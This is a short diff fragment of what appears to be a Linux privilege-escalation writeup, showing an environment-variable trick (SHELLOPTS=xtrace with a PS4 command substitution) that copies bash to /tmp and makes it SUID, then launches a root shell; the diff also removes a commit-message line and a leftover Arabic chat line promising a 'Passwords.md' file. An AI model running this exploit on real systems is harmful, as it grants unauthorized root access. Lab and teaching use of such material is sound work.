@@ -30,7 +30,4 @@ export -f /usr/sbin/service
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' ./suid-env2
 /tmp/rootbash -p
 
-4. Commit message:
-Add SUID exploits writeup
 
-خلصت؟ قولي "Done SUID" وأعطيك آخر ملف `Passwords.md`
